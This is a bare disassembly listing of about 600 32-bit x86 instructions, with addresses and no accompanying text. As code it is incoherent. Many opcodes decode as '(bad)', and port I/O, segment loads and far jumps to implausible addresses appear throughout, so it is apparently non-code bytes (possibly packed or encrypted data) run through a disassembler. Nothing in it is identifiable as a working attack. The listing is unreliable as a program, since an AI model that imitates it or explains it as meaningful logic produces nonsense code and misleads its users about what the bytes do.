  41694b:	psrad  mm2,QWORD PTR [eax+0x6054ab52]
  416952:	sub    edi,edi
  416954:	mov    ?,WORD PTR [ecx-0x2d]
  416957:	and    bh,BYTE PTR [eax-0x7e4a948f]
  41695d:	ds cld 
  41695f:	xchg   ebp,eax
  416960:	mov    al,0x67
  416962:	mov    esi,0x1013c680
  416967:	xor    esi,DWORD PTR [ecx+0x19adacdd]
  41696d:	xor    al,0xbc
  41696f:	out    0x87,al
  416971:	fstp   TBYTE PTR [ecx+0x4db0d263]
  416977:	jmp    0xdb36ddc1
  41697c:	les    eax,FWORD PTR [edx]
  41697e:	mov    cl,0x66
  416980:	out    0xdc,eax
  416982:	mov    ebp,0x3cc21337
  416987:	cmp    dl,BYTE PTR [ebx+0x55]
  41698a:	pop    ebp
  41698b:	call   0x32995e78
  416990:	popf   
  416991:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416992:	fisubr WORD PTR [edi+0x7ce7f9c]
  416998:	outs   dx,DWORD PTR ds:[esi]
  416999:	push   ecx
  41699a:	jbe    0x4169cc
  41699c:	sub    eax,0x964c54b8
  4169a1:	cmp    dl,BYTE PTR [edi]
  4169a3:	xchg   BYTE PTR [esi],bh
  4169a5:	push   DWORD PTR [edi+0xd11f788]
  4169ab:	aaa    
  4169ac:	js     0x4169e0
  4169ae:	adc    al,0x4f
  4169b0:	sub    al,0xd3
  4169b2:	cwde   
  4169b3:	les    esp,FWORD PTR [esi-0x6b9fc039]
  4169b9:	inc    esi
  4169ba:	arpl   WORD PTR [edx],cx
  4169bc:	inc    ebp
  4169bd:	in     al,0xe6
  4169bf:	jo     0x4169ac
  4169c1:	cld    
  4169c2:	fiadd  DWORD PTR [edi]
  4169c4:	sbb    ah,dl
  4169c6:	pop    DWORD PTR [esi+0x60c72770]
  4169cc:	mov    edx,0x2d5bd83d
  4169d1:	cld    
  4169d2:	adc    DWORD PTR [ecx],ebx
  4169d4:	pop    ss
  4169d5:	lods   al,BYTE PTR ds:[esi]
  4169d6:	fcom   QWORD PTR [edi]
  4169d8:	and    edx,DWORD PTR [ebx-0x75]
  4169db:	daa    
  4169dc:	fs leave 
  4169de:	xor    eax,0x7f786bd1
  4169e3:	shl    BYTE PTR [ebp+0x4c],1
  4169e6:	inc    ecx
  4169e7:	xchg   BYTE PTR ds:0x1f2025d0,bl
  4169ed:	jp     0x416974
  4169ef:	fadd   DWORD PTR [edx-0x43]
  4169f2:	dec    ebx
  4169f3:	push   ebx
  4169f4:	pop    ebx
  4169f5:	shr    DWORD PTR [ecx-0x6083f91e],0x2a
  4169fc:	and    DWORD PTR [ebx-0x7e43eabd],0xcc32c675
  416a06:	mov    eax,ds:0x53a3d9ab
  416a0b:	out    0xa4,eax
  416a0d:	xchg   edi,eax
  416a0e:	(bad)  
  416a0f:	pop    edx
  416a10:	pop    es
  416a11:	fsubp  st(5),st
  416a13:	pop    ss
  416a14:	adc    eax,0xa4e1cb49
  416a19:	in     al,dx
  416a1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a1b:	mov    ecx,ecx
  416a1d:	cmp    BYTE PTR [ebx-0x5ec79ed0],dh
  416a23:	out    0xf6,eax
  416a25:	test   eax,0x3e3b1636
  416a2a:	jo     0x4169c5
  416a2c:	out    0xea,al
  416a2e:	sbb    eax,0xe8557eb8
  416a33:	or     esi,DWORD PTR [eax]
  416a35:	mov    di,0x2a99
  416a39:	jmp    0x416a04
  416a3b:	adc    eax,0x6b984175
  416a40:	fisubr WORD PTR [esi+0x44ae19de]
  416a46:	dec    edi
  416a47:	mov    eax,ds:0xc62842d6
  416a4c:	mov    DWORD PTR [edi],ebx
  416a4e:	stos   DWORD PTR es:[edi],eax
  416a4f:	test   eax,0xa7ab74e9
  416a54:	(bad)  [ebp+0x9]
  416a57:	push   ss
  416a58:	cmp    BYTE PTR [eax+0x2dedd63c],0xcc
  416a5f:	(bad)  
  416a60:	out    0x12,al
  416a62:	xor    dh,BYTE PTR [ebp-0x5e]
  416a65:	nop
  416a66:	ficom  WORD PTR [edx+0x72c466f0]
  416a6c:	and    al,bl
  416a6e:	push   edi
  416a6f:	stos   BYTE PTR es:[edi],al
  416a70:	mov    ecx,0x9449b56b
  416a75:	pop    esp
  416a76:	mov    ebx,ecx
  416a78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a79:	lea    edx,[eax-0x35c9734e]
  416a7f:	scas   al,BYTE PTR es:[edi]
  416a80:	ds dec ecx
  416a82:	nop
  416a83:	dec    edx
  416a84:	imul   eax,DWORD PTR [edx+0x7faf8f50],0xd3878aff
  416a8e:	(bad)  
  416a8f:	sub    ebp,DWORD PTR [edx+0x56]
  416a92:	fsubr  DWORD PTR [edx+ebp*8]
  416a95:	sub    al,0xa9
  416a97:	jecxz  0x416a37
  416a99:	icebp  
  416a9a:	arpl   ax,si
  416a9c:	mov    esi,0xeceb1dbe
  416aa1:	cmp    DWORD PTR [eax+0x6a],ebp
  416aa4:	jge    0x416aae
  416aa6:	sbb    eax,0xbda9939a
  416aab:	ror    bh,cl
  416aad:	inc    esp
  416aae:	sub    BYTE PTR [edi+0x68],0x42
  416ab2:	and    DWORD PTR [esi-0x6f39984e],0x3c
  416ab9:	test   al,0xa8
  416abb:	mov    bl,0xf7
  416abd:	icebp  
  416abe:	popf   
  416abf:	mov    eax,ebp
  416ac1:	popa   
  416ac2:	rcl    DWORD PTR [eax+esi*1],1
  416ac5:	js     0x416b35
  416ac7:	shl    BYTE PTR [ecx-0x7039f8f7],1
  416acd:	dec    esi
  416ace:	cmp    al,0xbc
  416ad0:	mov    cl,dh
  416ad2:	dec    ebp
  416ad3:	pop    edi
  416ad4:	mov    eax,gs
  416ad6:	test   BYTE PTR ds:[edi+0x51],bh
  416ada:	nop
  416adb:	out    0x28,eax
  416add:	dec    ecx
  416ade:	fsub   DWORD PTR [ecx-0x52fc98f1]
  416ae4:	mov    dl,0xa9
  416ae6:	inc    edi
  416ae7:	outs   dx,BYTE PTR ds:[esi]
  416ae8:	popa   
  416ae9:	xchg   ecx,eax
  416aea:	test   eax,0x79199b18
  416aef:	lock ds jae 0x416ae0
  416af3:	popf   
  416af4:	js     0x416ad9
  416af6:	and    al,0x34
  416af8:	jb     0x416af6
  416afa:	ret    
  416afb:	sar    BYTE PTR [edx-0x7f],cl
  416afe:	(bad)  
  416b00:	pop    es
  416b01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b02:	push   edx
  416b03:	out    dx,al
  416b04:	in     eax,dx
  416b05:	xor    DWORD PTR [eax+0x2],eax
  416b08:	mov    eax,ds:0x12dc23eb
  416b0d:	mov    eax,ds:0x9fab896d
  416b12:	and    bh,BYTE PTR [edx+0x56]
  416b15:	fidiv  WORD PTR [ebp-0x79c77433]
  416b1b:	xor    BYTE PTR [esi-0x1a],dl
  416b1e:	rcr    dh,0xe7
  416b21:	xor    bl,BYTE PTR [ecx]
  416b23:	xor    ch,BYTE PTR [eax+0xa494fff]
  416b29:	xchg   ebp,eax
  416b2a:	sbb    eax,0x213bd725
  416b2f:	dec    esi
  416b30:	pusha  
  416b31:	test   eax,0x97bb6663
  416b36:	(bad)  
  416b37:	fstp   DWORD PTR [edx+0x53de6bdb]
  416b3d:	jecxz  0x416b68
  416b3f:	mov    DWORD PTR [esp+ebp*2-0x10e82491],ebp
  416b46:	pop    esi
  416b47:	out    dx,eax
  416b48:	repnz xor dx,WORD PTR [ebx+0x6e]
  416b4d:	xor    DWORD PTR [ecx+0x1930a01],eax
  416b53:	push   eax
  416b54:	pushf  
  416b55:	push   eax
  416b56:	or     ecx,eax
  416b58:	js     0x416b5e
  416b5a:	repnz lods eax,DWORD PTR ds:[esi]
  416b5c:	add    DWORD PTR [esp+eax*1],esi
  416b5f:	sub    al,0x55
  416b61:	in     al,0xe2
  416b63:	pop    esi
  416b64:	mov    bl,0x21
  416b66:	out    dx,eax
  416b67:	loope  0x416b61
  416b69:	sar    DWORD PTR [edx],0x94
  416b6c:	jmp    0x55d9:0x97cb8d12
  416b73:	xchg   esi,eax
  416b74:	mov    eax,0xa35e5303
  416b79:	push   edi
  416b7a:	leave  
  416b7b:	das    
  416b7c:	lods   eax,DWORD PTR ds:[esi]
  416b7d:	imul   edi,esi,0x8fbcbf4c
  416b83:	add    DWORD PTR [ebx+0x6c8b4a3c],esi
  416b89:	pop    esi
  416b8a:	mov    ebx,0xca85e97a
  416b8f:	scas   eax,DWORD PTR es:[edi]
  416b90:	pop    edi
  416b91:	es jge 0x416b44
  416b94:	and    esi,ebx
  416b96:	pop    esp
  416b97:	sub    BYTE PTR [ecx],al
  416b99:	pop    ebx
  416b9a:	daa    
  416b9b:	sub    eax,DWORD PTR [ecx+0x538acb61]
  416ba1:	cmp    al,0x4a
  416ba3:	aaa    
  416ba4:	aam    0xf5
  416ba6:	pusha  
  416ba7:	push   es
  416ba8:	fld    DWORD PTR [ebx+0x23896215]
  416bae:	cli    
  416baf:	gs cdq 
  416bb1:	inc    ecx
  416bb2:	xor    eax,0x42ecba2d
  416bb7:	cmp    eax,0x4f7e2f8a
  416bbc:	inc    ecx
  416bbd:	mov    ah,0x9b
  416bbf:	lods   eax,DWORD PTR ds:[esi]
  416bc0:	je     0x416b8b
  416bc2:	scas   al,BYTE PTR es:[edi]
  416bc3:	xchg   BYTE PTR [edx+0x647818e9],bh
  416bc9:	mov    esi,0x48fe0eb5
  416bce:	push   ds
  416bcf:	dec    eax
  416bd0:	adc    esi,DWORD PTR [edx]
  416bd2:	mov    eax,ds:0x3ad75e57
  416bd7:	out    dx,eax
  416bd8:	adc    DWORD PTR gs:[ebx],edx
  416bdb:	push   ss
  416bdc:	ja     0x416c1e
  416bde:	cmp    al,BYTE PTR [esi]
  416be0:	xchg   esp,eax
  416be1:	xor    eax,DWORD PTR [edx]
  416be3:	xor    ecx,DWORD PTR [ecx-0x2b]
  416be6:	mov    ds:0xccb689b6,eax
  416beb:	ss out 0xd4,eax
  416bee:	xchg   edx,eax
  416bef:	add    DWORD PTR [ecx+0x35],eax
  416bf2:	mov    DWORD PTR [edi-0x7f],ebp
  416bf5:	ror    DWORD PTR [edi+ecx*8],cl
  416bf8:	repz jmp 0x416c5c
  416bfb:	dec    edi
  416bfc:	cmp    DWORD PTR [edx+0xa],edi
  416bff:	loope  0x416c00
  416c01:	cmp    DWORD PTR [ecx],0xffffffb6
  416c04:	mov    esp,0x87f3ff82
  416c09:	in     al,0x49
  416c0b:	je     0x416bf1
  416c0d:	mov    ecx,0x67599b69
  416c13:	(bad)  
  416c14:	out    dx,eax
  416c15:	or     ah,BYTE PTR [ebx]
  416c17:	pop    ds
  416c18:	sub    DWORD PTR [edi+0x5c],edi
  416c1b:	lods   al,BYTE PTR ds:[esi]
  416c1c:	inc    edx
  416c1d:	pushf  
  416c1e:	addr16 mov al,0x5d
  416c21:	out    0x1e,eax
  416c23:	mov    dl,0xb1
  416c25:	cs dec esp
  416c27:	mov    cl,0xe7
  416c29:	lahf   
  416c2a:	fs loop 0x416c22
  416c2d:	pop    edi
  416c2e:	dec    edi
  416c2f:	add    eax,0xdcb55831
  416c34:	mov    edx,0x116afe9d
  416c39:	retf   
  416c3a:	sub    eax,0x2836b7f5
  416c3f:	sbb    eax,0x6e03438d
  416c44:	jno    0x416c99
  416c46:	in     eax,dx
  416c47:	nop
  416c48:	pop    ebx
  416c49:	in     eax,dx
  416c4a:	jmp    0xa6f15192
  416c4f:	jmp    0xfcfa76ae
  416c54:	imul   esp,DWORD PTR [ecx-0x57],0x9398c180
  416c5b:	scas   al,BYTE PTR es:[edi]
  416c5c:	pop    esp
  416c5d:	xor    esp,DWORD PTR ds:0xdbac7ac2
  416c63:	out    dx,al
  416c64:	sbb    BYTE PTR ds:0xab857a2b,cl
  416c6a:	add    eax,0x623564b2
  416c6f:	pop    es
  416c70:	push   esp
  416c71:	and    ah,bl
  416c73:	xchg   esp,eax
  416c74:	adc    edx,DWORD PTR [ebp+0x44ff3c5b]
  416c7a:	mov    BYTE PTR [eax+0x52],bh
  416c7d:	sbb    ecx,DWORD PTR [ecx-0x45d4165d]
  416c83:	push   0x51
  416c85:	cmp    BYTE PTR [ebp-0x76702c13],ch
  416c8b:	dec    ebp
  416c8c:	fsubr  DWORD PTR [edx]
  416c8e:	retf   0xc9bd
  416c91:	mov    esi,0x80644da
  416c96:	or     DWORD PTR [ecx+0x7014653b],0x77
  416c9d:	mov    al,0x8a
  416c9f:	mov    ch,0xcd
  416ca1:	and    al,0xca
  416ca3:	rol    BYTE PTR [eax+eax*8-0x17017c99],0x89
  416cab:	sti    
  416cac:	loope  0x416c83
  416cae:	lods   eax,DWORD PTR ds:[esi]
  416caf:	push   0x43cc9088
  416cb4:	out    0x16,al
  416cb6:	mov    edi,0x11279a79
  416cbb:	and    eax,0xb52b3f19
  416cc0:	push   ss
  416cc1:	nop
  416cc2:	or     ebx,esi
  416cc4:	(bad)
  416cc7:	vdivpd xmm7,xmm1,XMMWORD PTR [esi]
  416ccb:	push   eax
  416ccc:	addr16 jbe 0x416c7f
  416ccf:	mov    ebx,0xdf035ce
  416cd4:	cli    
  416cd5:	push   0x5c797b53
  416cda:	outs   dx,DWORD PTR ds:[esi]
  416cdb:	loop   0x416d39
  416cdd:	mov    ss,ecx
  416cdf:	pusha  
  416ce0:	inc    esi
  416ce1:	in     al,0xc6
  416ce3:	imul   esp,DWORD PTR [eax+eax*4-0x57],0x83a8290
  416ceb:	pop    ss
  416cec:	mov    ah,0xd
  416cee:	xchg   BYTE PTR [ebx+ebx*1],ch
  416cf1:	and    edi,esi
  416cf3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416cf4:	mov    bh,0xc1
  416cf6:	and    al,0x9
  416cf8:	inc    esi
  416cf9:	jmp    0x416cec
  416cfb:	push   0x48
  416cfd:	mov    ds:0x12a804f7,al
  416d02:	and    DWORD PTR [eax+0x5],0xffffff88
  416d06:	push   ebp
  416d07:	inc    ebx
  416d08:	inc    ecx
  416d09:	shl    cl,0xc6
  416d0c:	dec    esp
  416d0d:	cmp    dl,BYTE PTR [ebp+edi*4+0x3c]
  416d11:	jae    0x416d59
  416d13:	fldz   
  416d15:	add    BYTE PTR [edi],dl
  416d17:	imul   esp,DWORD PTR [esi+edi*1-0x14],0xa213045c
  416d1f:	cwde   
  416d20:	(bad)  
  416d21:	sub    dh,BYTE PTR [ecx-0x76]
  416d24:	sahf   
  416d25:	pop    ecx
  416d26:	js     0x416cad
  416d28:	dec    eax
  416d29:	test   esp,ecx
  416d2b:	mov    ah,0x9b
  416d2d:	jae    0x416ce1
  416d2f:	xor    al,0x91
  416d31:	sub    al,0x5
  416d33:	out    dx,al
  416d34:	adc    eax,0xac25d5a5
  416d39:	ss lahf 
  416d3b:	adc    bh,BYTE PTR [ecx+0xa]
  416d3e:	sar    BYTE PTR [esi+0x79],0xd4
  416d42:	mov    ah,0x17
  416d44:	mov    eax,ds:0x66c8d13f
  416d49:	in     al,dx
  416d4a:	inc    ebp
  416d4b:	and    ebp,edx
  416d4d:	jb     0x416da2
  416d4f:	sbb    eax,0x1b649f17
  416d54:	sahf   
  416d55:	xor    al,0x98
  416d57:	pop    esp
  416d58:	push   ebx
  416d59:	pop    edx
  416d5a:	(bad)  [ebx+0x1dbd6cba]
  416d60:	lock jae 0x416d2d
  416d63:	pop    ebp
  416d64:	adc    DWORD PTR [edi],esp
  416d66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d67:	pop    esi
  416d68:	test   BYTE PTR [edx],bh
  416d6a:	sub    eax,0xcb76ef3b
  416d6f:	inc    ebx
  416d70:	pop    esp
  416d71:	dec    edi
  416d72:	or     DWORD PTR [ecx+0x3b12970e],ebx
  416d78:	repnz mov ebp,0x821af83e
  416d7e:	inc    edx
  416d7f:	gs jmp 0x416d3b
  416d82:	inc    esp
  416d83:	rol    BYTE PTR [esp+edx*1+0x5023142b],cl
  416d8a:	fstp   QWORD PTR [ecx]
  416d8c:	jno    0x416d1f
  416d8e:	fild   DWORD PTR [ebp+eiz*1-0x13]
  416d92:	or     ah,al
  416d94:	arpl   bp,bp
  416d96:	lock xchg DWORD PTR [eax+edi*8],ebp
  416d9a:	mov    esi,0x664e0a94
  416d9f:	out    dx,al
  416da0:	inc    esp
  416da1:	mov    dl,0x3a
  416da3:	and    bl,BYTE PTR [ecx]
  416da5:	push   ecx
  416da6:	enter  0x5e91,0x68
  416daa:	stc    
  416dab:	push   ecx
  416dac:	mov    ah,0x2e
  416dae:	jae    0x416d6a
  416db0:	dec    esi
  416db1:	ror    ah,cl
  416db3:	push   0xf78a5784
  416db8:	sbb    al,0xf0
  416dba:	sub    DWORD PTR [esi+0x2f],ebp
  416dbd:	pop    es
  416dbe:	xor    DWORD PTR [eax+0x1d5bd1f],eax
  416dc4:	sub    al,0x64
  416dc6:	cli    
  416dc7:	popa   
  416dc8:	sub    ebp,DWORD PTR [ecx+0x7f9ed0e7]
  416dce:	fdivr  QWORD PTR [eax-0x6e]
  416dd1:	sub    DWORD PTR [esi],esp
  416dd3:	jmp    0x953d5d18
  416dd8:	popa   
  416dd9:	adc    eax,0x9b69a296
  416dde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ddf:	lods   eax,DWORD PTR ds:[esi]
  416de0:	sbb    DWORD PTR [ecx+edx*4],esi
  416de3:	lods   al,BYTE PTR ds:[esi]
  416de4:	movhps QWORD PTR [ebp+ebp*1+0x32c1213e],xmm4
  416dec:	and    ebx,esi
  416dee:	loop   0x416dd3
  416df0:	rcl    DWORD PTR [ebp+edi*2+0x2f],0x21
  416df5:	and    DWORD PTR [edx-0x58],eax
  416df8:	gs pop ecx
  416dfa:	xchg   ebp,eax
  416dfb:	daa    
  416dfc:	outs   dx,BYTE PTR ds:[esi]
  416dfd:	rcl    BYTE PTR ds:0xfb09328d,0x80
  416e04:	call   0x8d0f2dd0
  416e09:	or     dh,BYTE PTR [ebx-0x53]
  416e0c:	mov    ch,0x30
  416e0e:	add    DWORD PTR [edi-0x6b839e2f],ecx
  416e14:	mov    bl,0x97
  416e16:	jecxz  0x416d9e
  416e18:	dec    edi
  416e19:	icebp  
  416e1a:	mov    gs,ebp
  416e1c:	in     al,dx
  416e1d:	and    eax,0x6920b898
  416e22:	fs loop 0x416e98
  416e25:	ins    DWORD PTR es:[edi],dx
  416e26:	jl     0x416e28
  416e28:	pop    esi
  416e29:	mov    al,ds:0x9700571b
  416e2e:	(bad)  
  416e2f:	mov    BYTE PTR [ebp-0x7a],cl
  416e32:	mov    ds:0x8d537fc6,eax
  416e37:	sub    dl,BYTE PTR [ebx+0x6c542ecb]
  416e3d:	test   DWORD PTR [eax-0x35],esp
  416e40:	mov    dh,0xd3
  416e42:	mov    ?,WORD PTR [ebx+0x1]
  416e45:	int3   
  416e46:	fnstenv [edx]
  416e48:	aam    0xa0
  416e4a:	xchg   ebx,eax
  416e4b:	lods   al,BYTE PTR ds:[esi]
  416e4c:	mov    ah,ch
  416e4e:	cdq    
  416e4f:	mov    fs,WORD PTR [edi]
  416e51:	fs add eax,0x81701977
  416e57:	imul   edi,DWORD PTR [ebp+edx*2-0x48896412],0xc0ee2c2e
  416e62:	mov    eax,ds:0x2b2bb206
  416e67:	rol    bl,cl
  416e69:	in     al,0x30
  416e6b:	mov    ecx,ecx
  416e6d:	sub    ecx,eax
  416e6f:	xchg   edi,eax
  416e70:	pop    ss
  416e71:	shl    BYTE PTR [ecx],1
  416e73:	fldenv [edi-0x78]
  416e76:	mov    bl,BYTE PTR [esi]
  416e78:	sub    al,0x72
  416e7a:	shr    al,1
  416e7c:	shl    DWORD PTR [edi+0x73f4b518],cl
  416e82:	inc    edx
  416e83:	xor    al,0x99
  416e85:	inc    eax
  416e86:	jecxz  0x416ef3
  416e88:	xor    DWORD PTR [ecx+0x4cbd0c03],ebx
  416e8e:	les    esi,FWORD PTR [ebx-0x25]
  416e91:	sbb    eax,0x27dd26f5
  416e96:	xor    eax,0x5a82c9e7
  416e9b:	adc    cl,ah
  416e9d:	sbb    DWORD PTR [edx],0xffffffa8
  416ea0:	out    dx,al
  416ea1:	ins    BYTE PTR es:[edi],dx
  416ea2:	jne    0x416f03
  416ea4:	arpl   WORD PTR [edi+ebx*4-0x538eeff5],cx
  416eab:	les    eax,FWORD PTR [ebp-0x37]
  416eae:	mov    eax,0xb89a3750
  416eb3:	add    dh,ah
  416eb5:	mov    DWORD PTR [edi],eax
  416eb7:	cmp    eax,0x13b52eba
  416ebc:	mov    ecx,0x39956a0c
  416ec1:	outs   dx,DWORD PTR ds:[esi]
  416ec2:	js     0x416f02
  416ec4:	cmc    
  416ec5:	sub    ch,ah
  416ec7:	push   ebx
  416ec8:	or     eax,0x1e72f1bf
  416ecd:	into   
  416ece:	pushf  
  416ecf:	or     BYTE PTR [edi+0x6fe38da6],cl
  416ed5:	sbb    al,cl
  416ed7:	mul    BYTE PTR [eax+ebp*1+0x25]
  416edb:	inc    esi
  416edc:	xor    DWORD PTR [ecx-0x7],esp
  416edf:	js     0x416e7f
  416ee1:	xchg   DWORD PTR [edi-0x3d],esp
  416ee4:	dec    esp
  416ee5:	dec    esi
  416ee6:	test   eax,0x94d1aa63
  416eeb:	loope  0x416f62
  416eed:	or     eax,0x81697ac0
  416ef2:	xor    bl,BYTE PTR [ecx+0x1ca41a31]
  416ef8:	mov    WORD PTR [ecx-0x33ede6db],ss
  416efe:	mov    esp,0xc3e099de
  416f03:	xchg   ax,ax
  416f05:	test   BYTE PTR [ebx],0xd9
  416f08:	mov    al,ds:0x2b164d3a
  416f0d:	dec    eax
  416f0e:	push   esi
  416f0f:	inc    ebx
  416f10:	ds clc 
  416f12:	mov    bl,0x3c
  416f14:	jbe    0x416f02
  416f16:	shl    edi,1
  416f18:	loop   0x416edf
  416f1a:	xchg   ebp,eax
  416f1b:	mov    ds:0x94cafbd6,al
  416f20:	fst    DWORD PTR [edx]
  416f22:	pop    edi
  416f23:	xchg   ebp,eax
  416f24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f25:	fidivr WORD PTR [edi-0x2]
  416f28:	out    0x9d,al
  416f2a:	push   edx
  416f2b:	jge    0x416f3e
  416f2d:	adc    edi,DWORD PTR [edi]
  416f2f:	sbb    bl,bh
  416f31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f32:	xchg   esi,eax
  416f33:	mov    esp,ebx
  416f35:	mov    edx,0x57231ade
  416f3a:	bound  ebp,QWORD PTR ss:[edi+0x54bb1366]
  416f41:	lods   eax,DWORD PTR ds:[esi]
  416f42:	cmp    DWORD PTR [edi],edx
  416f44:	sub    al,0x5e
  416f46:	jg     0x416fad
  416f48:	icebp  
  416f49:	es in  eax,0xfc
  416f4c:	mov    BYTE PTR [eax+0x6f],al
  416f4f:	push   ecx
  416f50:	stos   DWORD PTR es:[di],eax
  416f52:	push   edx
  416f53:	pusha  
  416f54:	inc    ebp
  416f55:	sahf   
  416f56:	int3   
  416f57:	inc    BYTE PTR [ebp-0x1f]
  416f5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f5c:	sti    
  416f5d:	push   eax
  416f5e:	nop
  416f5f:	jg     0x416f2e
  416f61:	sub    al,0x14
  416f63:	inc    esi
  416f64:	jmp    0xc398:0xdd4326e8
  416f6b:	retf   0xf2d2
  416f6e:	push   ebx
  416f6f:	(bad)  
  416f71:	bound  esp,QWORD PTR ds:0xbb7d0b51
  416f77:	stos   BYTE PTR es:[edi],al
  416f78:	iret   
  416f79:	or     eax,0x75bdb1ca
  416f7e:	daa    
  416f7f:	aad    0xbb
  416f81:	and    BYTE PTR [ebp+0x683a3086],ch
  416f87:	mov    edi,0xf7b5f8e
  416f8c:	fs (bad) 
  416f8f:	xchg   DWORD PTR [ebx-0x6f],esi
  416f92:	pop    DWORD PTR [ebx+0x3c]
  416f95:	sub    ch,BYTE PTR [eax-0x9]
  416f98:	int    0xe6
  416f9a:	sub    DWORD PTR [edi+0x40a9f4f0],ecx
  416fa0:	and    DWORD PTR [ecx-0x52],ebp
  416fa3:	push   ebx
  416fa4:	inc    edi
  416fa5:	into   
  416fa6:	add    DWORD PTR [ebx-0x69],ebx
  416fa9:	cdq    
  416faa:	mov    esp,0xc6d4b402
  416faf:	xchg   ebx,eax
  416fb0:	jl     0x416fe0
  416fb2:	or     al,0x15
  416fb4:	jo     0x416fb0
  416fb6:	mov    ebp,0x9e9fbffb
  416fbb:	test   DWORD PTR [ecx+0x18],esi
  416fbe:	ret    0x431f
  416fc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416fc2:	adc    eax,0x175711d6
  416fc7:	adc    al,0x5f
  416fc9:	mov    eax,0xd3c0a333
  416fce:	(bad)  
  416fcf:	xchg   edi,eax
  416fd0:	push   edi
  416fd1:	inc    ebp
  416fd2:	or     BYTE PTR [ebx],ah
  416fd4:	adc    bl,BYTE PTR [edi+0x79cfa1ad]
  416fda:	loop   0x416fe0
  416fdc:	jg     0x416fd9
  416fde:	nop
  416fdf:	xchg   ebp,eax
  416fe0:	imul   edi,DWORD PTR [ebp-0x1f8612c9],0xffffff85
  416fe7:	inc    edx
  416fe8:	inc    ebx
  416fe9:	fldcw  WORD PTR [ecx-0x117ad596]
  416fef:	mov    ds:0x9df7de96,eax
  416ff4:	add    ah,ah
  416ff6:	and    al,0x89
  416ff8:	fxch   st(5)
  416ffa:	es dec esi
  416ffc:	adc    ah,dl
  416ffe:	pop    ds
  416fff:	pushf  
  417000:	out    0x45,al
  417002:	mov    ds:0xc33bdc5d,al
  417007:	dec    ebp
  417008:	sub    BYTE PTR [ebx],dh
  41700a:	xor    BYTE PTR [ebx+edi*4-0x29],ah
  41700e:	dec    ebp
  41700f:	daa    
  417010:	lea    esp,ds:0xf04f1eb8
  417016:	sahf   
  417017:	es xchg edx,eax
  417019:	fwait
  41701a:	pop    ecx
  41701b:	popf   
  41701c:	rcl    DWORD PTR ds:0x45a67ce9,1
  417022:	outs   dx,DWORD PTR ds:[esi]
  417023:	rol    BYTE PTR [ebx-0x29],1
  417026:	cld    
  417027:	sbb    DWORD PTR [edi+0x48],esi
  41702a:	sar    BYTE PTR [edi],0xc5
  41702d:	push   ebp
  41702e:	icebp  
  41702f:	and    BYTE PTR [ecx],0x73
  417032:	jmp    0x2836435c
  417037:	jl     0x4170b4
  417039:	jmp    FWORD PTR [eax]
  41703b:	arpl   WORD PTR [esi+ebx*8+0x4e6685eb],bx
  417042:	cwde   
  417043:	sub    eax,0x3dc8b3e1
  417048:	and    al,0xf6
  41704a:	mov    BYTE PTR [eax+0x3c],bl
  41704d:	rol    BYTE PTR [edi],cl
  41704f:	pop    ss
  417050:	enter  0xde1e,0x5a
  417054:	add    al,0x7b
  417056:	imul   esp,edx,0x9b9ff862
  41705c:	push   cs
  41705d:	imul   eax,ebp,0x35
  417060:	daa    
  417061:	sbb    al,0xa2
  417063:	rcr    ecx,cl
  417065:	sbb    ebp,ebp
  417067:	add    esp,esp
  417069:	loopne 0x41701d
  41706b:	clc    
  41706c:	push   edi
  41706d:	cld    
  41706e:	repz mov esi,0xde897c79
  417074:	dec    edx
  417075:	lock adc BYTE PTR [ebx-0x1f7c86b3],ch
  41707c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41707d:	cmp    dh,BYTE PTR [edx]
  41707f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417080:	jae    0x4170ce
  417082:	bound  esp,QWORD PTR [esi-0x68]
  417085:	cli    
  417086:	sub    edi,DWORD PTR [esi-0x4119e121]
  41708c:	add    DWORD PTR [ebx],edi
  41708e:	jnp    0x41706f
  417090:	repnz ss push 0xa78a6494
  417097:	add    DWORD PTR [ecx+edx*4],esi
  41709a:	or     eax,0x5ebc0375
  41709f:	ret    
  4170a0:	test   cl,ah
  4170a2:	addr16 jo 0x4170e1
  4170a5:	inc    eax
  4170a6:	mov    ah,0x28
  4170a8:	mov    bl,BYTE PTR [ecx]
  4170aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170ab:	push   esp
  4170ac:	addr16 xchg ebx,eax
  4170ae:	fisub  DWORD PTR [edx]
  4170b0:	and    edx,eax
  4170b2:	mov    ebx,0x8224360
  4170b7:	pop    eax
  4170b8:	js     0x417108
  4170ba:	addr16 sar esi,1
  4170bd:	je     0x41709d
  4170bf:	(bad)  
  4170c0:	das    
  4170c1:	mov    al,ds:0xcec0d4f9
  4170c6:	or     eax,0x6b318c2d
  4170cb:	retf   
  4170cc:	xchg   ecx,ebp
  4170ce:	pop    ecx
  4170cf:	fwait
  4170d0:	mov    esi,0xa8bd8b96
  4170d5:	mov    ds:0x84a7ac14,al
  4170da:	bound  edi,QWORD PTR [ebx+0x24ca0f47]
  4170e0:	xchg   ecx,eax
  4170e1:	adc    ebp,DWORD PTR [edx+eiz*8+0x6b65694a]
  4170e8:	xchg   edx,eax
  4170e9:	sub    BYTE PTR [ecx-0x275eeeb9],bh
  4170ef:	jne    0x4170bb
  4170f1:	add    DWORD PTR [edx+0x3],edi
  4170f4:	(bad)  
  4170f5:	fbld   TBYTE PTR [ecx]
  4170f7:	out    dx,al
  4170f8:	jne    0x41708b
  4170fa:	xchg   bh,ch
  4170fc:	retf   0xf2ee
  4170ff:	sub    BYTE PTR [ebx+0x2fed9a0e],dl
  417105:	dec    ebp
  417106:	js     0x417101
  417108:	icebp  
  417109:	das    
  41710a:	dec    esi
  41710b:	jae    0x4170db
  41710d:	ficomp WORD PTR [ecx]
  41710f:	gs mov eax,0xbb310a8c
